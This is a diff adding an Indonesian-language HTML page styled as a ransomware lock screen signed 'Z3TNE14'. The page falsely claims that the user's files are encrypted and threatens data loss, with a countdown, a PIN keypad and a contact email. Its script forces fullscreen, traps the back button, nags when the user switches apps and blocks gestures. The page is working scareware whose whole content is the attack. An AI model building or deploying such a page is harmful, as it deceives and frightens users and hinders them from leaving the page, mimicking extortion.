@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>🔴 SYSTEM LOCKED - Z3TNE14 🔴</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+        }
+        
+        html, body {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: #000000;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 5px;
+            color: #ff0000;
+            font-size: 12px;
+        }
+        
+        /* CONTAINER UTAMA - DISESUAIKAN */
+        .container {
+            width: 100%;
+            max-width: 360px;
+            background: #0a0a0a;
+            border: 2px solid #ff0000;
+            border-radius: 15px;
+            padding: 10px 8px;
+            box-shadow: 0 0 30px rgba(255,0,0,0.3);
+            max-height: 95vh;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+            position: relative;
+            z-index: 100;
+        }
+        
+        /* SEMUA ELEMEN DIKECILIN LAGI */
+        .header h1 {
+            color: #ff0000;
+            font-size: 14px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            text-align: center;
+        }
+        
+        .header h2 {
+            color: #ff6666;
+            font-size: 12px;
+            margin-top: 2px;
+            text-align: center;
+        }
+        
+        .warning {
+            background: rgba(255,0,0,0.1);
+            border-left: 2px solid #ff0000;
+            padding: 6px;
+            margin-bottom: 6px;
+            font-size: 9px;
+            line-height: 1.2;
+        }
+        
+        .warning .critical {
+            font-size: 10px;
+            margin-bottom: 2px;
+        }
+        
+        .file-list {
+            background: #000000;
+            border: 1px solid #ff3333;
+            border-radius: 5px;
+            padding: 6px;
+            margin-bottom: 6px;
+            font-size: 8px;
+        }
+        
+        .file-list div {
+            margin: 2px 0;
+        }
+        
+        .danger-zone {
+            background: rgba(255,0,0,0.15);
+            border: 1px solid #ff0000;
+            border-radius: 5px;
+            padding: 6px;
+            margin-bottom: 6px;
+            font-size: 9px;
+        }
+        
+        .danger-item {
+            margin: 2px 0;
+            display: flex;
+            align-items: center;
+        }
+        
+        .danger-item:before {
+            content: "⚠️";
+            margin-right: 4px;
+            font-size: 8px;
+        }
+        
+        .countdown {
+            text-align: center;
+            background: #1a0000;
+            border: 1px solid #ff0000;
+            border-radius: 8px;
+            padding: 6px;
+            margin-bottom: 8px;
+        }
+        
+        .countdown-label {
+            font-size: 8px;
+            margin-bottom: 2px;
+        }
+        
+        .countdown-time {
+            font-size: 20px;
+            letter-spacing: 2px;
+            font-weight: bold;
+        }
+        
+        .pin-section {
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        
+        .pin-label {
+            font-size: 10px;
+            margin-bottom: 4px;
+        }
+        
+        .pin-display {
+            font-size: 22px;
+            letter-spacing: 5px;
+            padding: 4px;
+            margin: 4px 0;
+            background: #000000;
+            border: 1px solid #ff3333;
+            border-radius: 8px;
+            color: #ff0000;
+        }
+        
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 5px;
+            margin-bottom: 6px;
+        }
+        
+        .keypad button {
+            background: #1a1a1a;
+            border: 1px solid #ff3333;
+            border-radius: 25px;
+            padding: 10px 0;
+            font-size: 18px;
+            color: #ff0000;
+            cursor: pointer;
+            pointer-events: auto;
+        }
+        
+        .keypad button:active {
+            background: #ff0000;
+            color: black;
+        }
+        
+        .action-buttons {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 5px;
+            margin-bottom: 6px;
+        }
+        
+        .action-buttons button {
+            background: #2a0000;
+            border: 1px solid #ff6666;
+            border-radius: 20px;
+            padding: 6px 0;
+            font-size: 12px;
+            color: #ffaaaa;
+            cursor: pointer;
+            pointer-events: auto;
+        }
+        
+        .action-buttons button:active {
+            background: #ff0000;
+            color: white;
+        }
+        
+        .attempts {
+            font-size: 10px;
+            margin: 4px 0;
+            color: #ff8888;
+        }
+        
+        .note {
+            background: #0d0d0d;
+            border: 1px solid #ff3333;
+            border-radius: 5px;
+            padding: 6px;
+            margin: 6px 0;
+            font-size: 7px;
+            line-height: 1.2;
+        }
+        
+        .footer {
+            font-size: 7px;
+            margin-top: 5px;
+            padding-top: 4px;
+            text-align: center;
+            border-top: 1px solid #ff3333;
+        }
+        
+        .email {
+            font-size: 7px;
+            color: #ff0000;
+        }
+        
+        /* HIDE SCROLLBAR */
+        .container::-webkit-scrollbar {
+            display: none;
+        }
+        
+        /* BLOCKER TIPIS - GA NUTUP TOMBOL */
+        .top-blocker {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 20px;
+            background: black;
+            z-index: 50;
+            pointer-events: none; /* TIDAK BLOKIR */
+        }
+        
+        .bottom-blocker {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 20px;
+            background: black;
+            z-index: 50;
+            pointer-events: none; /* TIDAK BLOKIR */
+        }
+        
+        /* OVERLAY KHUSUS BLOKIR GESTURE - TAPI GA NUTUP TOMBOL */
+        .gesture-blocker {
+            position: fixed;
+            top: 20px;
+            left: 0;
+            width: 100%;
+            height: calc(100% - 40px);
+            background: transparent;
+            z-index: 90;
+            pointer-events: none; /* TIDAK BLOKIR */
+        }
+    </style>
+</head>
+<body>
+    <!-- BLOCKER CUMA BUAT GESTURE - GA NUTUP TOMBOL -->
+    <div class="top-blocker"></div>
+    <div class="bottom-blocker"></div>
+    <div class="gesture-blocker"></div>
+    
+    <!-- MAIN CONTENT -->
+    <div class="container">
+        <!-- HEADER -->
+        <div class="header">
+            <h1># SYSTEM LOCKED</h1>
+            <h2>Z3TNE14</h2>
+        </div>
+        
+        <!-- WARNING -->
+        <div class="warning">
+            <div class="critical">⚠️ PERINGATAN KRITIS ⚠️</div>
+            SELURUH DATA DIENKRIPSI!
+        </div>
+        
+        <!-- FILE LIST -->
+        <div class="file-list">
+            <div>📁 DOC, PDF, JPG, MP4</div>
+            <div>📸 FOTO, VIDEO, DOKUMEN</div>
+            <div>💀 KELUAR = DATA HILANG</div>
+        </div>
+        
+        <!-- DANGER ZONE -->
+        <div class="danger-zone">
+            <div class="danger-item">JANGAN MATIKAN HP</div>
+            <div class="danger-item">JANGAN TEKAN BACK</div>
+        </div>
+        
+        <!-- COUNTDOWN -->
+        <div class="countdown">
+            <div class="countdown-label">⏳ WAKTU TERSISA ⏳</div>
+            <div class="countdown-time" id="countdown">23:59:59</div>
+        </div>
+        
+        <!-- PIN SECTION -->
+        <div class="pin-section">
+            <div class="pin-label">🔑 MASUKKAN PIN 🔑</div>
+            <div class="pin-display" id="pinDisplay">****</div>
+            
+            <!-- KEYPAD -->
+            <div class="keypad">
+                <button onclick="addNumber(1)">1</button>
+                <button onclick="addNumber(2)">2</button>
+                <button onclick="addNumber(3)">3</button>
+                <button onclick="addNumber(4)">4</button>
+                <button onclick="addNumber(5)">5</button>
+                <button onclick="addNumber(6)">6</button>
+                <button onclick="addNumber(7)">7</button>
+                <button onclick="addNumber(8)">8</button>
+                <button onclick="addNumber(9)">9</button>
+            </div>
+            
+            <!-- ACTION BUTTONS -->
+            <div class="action-buttons">
+                <button onclick="clearPin()">CLEAR</button>
+                <button onclick="checkPin()">ENTER</button>
+            </div>
+            
+            <div class="attempts" id="attemptsDisplay">0 / 5</div>
+        </div>
+        
+        <!-- NOTE -->
+        <div class="note">
+            📝 Email: <span class="email">z3tne14@mail.com</span>
+        </div>
+        
+        <!-- FOOTER -->
+        <div class="footer">
+            PIN: 6969 | Z3TNE14
+        </div>
+    </div>
+
+    <script>
+        // ========== KONFIGURASI ==========
+        const CORRECT_PIN = "6969";
+        const MAX_ATTEMPTS = 5;
+        
+        let currentPin = "";
+        let attempts = 0;
+        let timeLeft = 23 * 3600 + 59 * 60 + 59;
+        let isUnlocked = false;
+        
+        // ========== DISPLAY ==========
+        function updatePinDisplay() {
+            let display = "";
+            for (let i = 0; i < 4; i++) {
+                display += (i < currentPin.length) ? "●" : "○";
+            }
+            document.getElementById('pinDisplay').innerText = display;
+        }
+        
+        function updateAttempts() {
+            document.getElementById('attemptsDisplay').innerText = `${attempts} / ${MAX_ATTEMPTS}`;
+        }
+        
+        // ========== KEYPAD ==========
+        function addNumber(num) {
+            if (currentPin.length < 4) {
+                currentPin += num.toString();
+                updatePinDisplay();
+            }
+        }
+        
+        function clearPin() {
+            currentPin = "";
+            updatePinDisplay();
+        }
+        
+        // ========== CEK PIN ==========
+        function checkPin() {
+            if (currentPin.length < 4) {
+                alert("PIN harus 4 digit!");
+                return;
+            }
+            
+            if (currentPin === CORRECT_PIN) {
+                isUnlocked = true;
+                document.body.innerHTML = `
+                    <div style="background: #00b09b; height: 100vh; display: flex; justify-content: center; align-items: center; color: white; text-align: center; padding: 20px;">
+                        <div>
+                            <div style="font-size: 60px; margin-bottom: 20px;">✅</div>
+                            <div style="font-size: 24px;">UNLOCKED!</div>
+                            <div style="font-size: 16px;">- Z3TNE14 -</div>
+                        </div>
+                    </div>
+                `;
+                if (document.fullscreenElement) document.exitFullscreen();
+            } else {
+                attempts++;
+                updateAttempts();
+                
+                if (attempts >= MAX_ATTEMPTS) {
+                    document.body.innerHTML = `
+                        <div style="background: black; color: red; height: 100vh; display: flex; justify-content: center; align-items: center; text-align: center;">
+                            <div>
+                                <div style="font-size: 60px;">💀</div>
+                                <div style="font-size: 24px;">DATA HILANG!</div>
+                            </div>
+                        </div>
+                    `;
+                } else {
+                    alert(`❌ PIN SALAH! Sisa: ${MAX_ATTEMPTS - attempts}`);
+                    clearPin();
+                }
+            }
+        }
+        
+        // ========== COUNTDOWN ==========
+        function updateCountdown() {
+            if (isUnlocked) return;
+            
+            let h = Math.floor(timeLeft / 3600);
+            let m = Math.floor((timeLeft % 3600) / 60);
+            let s = timeLeft % 60;
+            
+            document.getElementById('countdown').innerHTML = 
+                `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+                setTimeout(updateCountdown, 1000);
+            }
+        }
+        
+        // ========== LOCK ==========
+        
+        // Force fullscreen
+        function forceFullScreen() {
+            if (isUnlocked) return;
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }
+        }
+        forceFullScreen();
+        setInterval(forceFullScreen, 1000);
+        
+        // Block back button
+        history.pushState(null, null, location.href);
+        window.onpopstate = function() {
+            if (isUnlocked) return;
+            history.go(1);
+            alert('🔙 GA BISA BACK!');
+        };
+        
+        // Block pindah app
+        window.addEventListener('blur', function() {
+            if (isUnlocked) return;
+            setTimeout(() => {
+                alert('⚠️ KEMBALI!');
+                window.focus();
+            }, 10);
+        });
+        
+        // Block gesture HALUS (ga ganggu tombol)
+        document.addEventListener('touchmove', (e) => {
+            if (isUnlocked) return;
+            e.preventDefault();
+        }, { passive: false });
+        
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        
+        // ========== INIT ==========
+        updatePinDisplay();
+        updateAttempts();
+        updateCountdown();
+    </script>
+</body>
+</html>
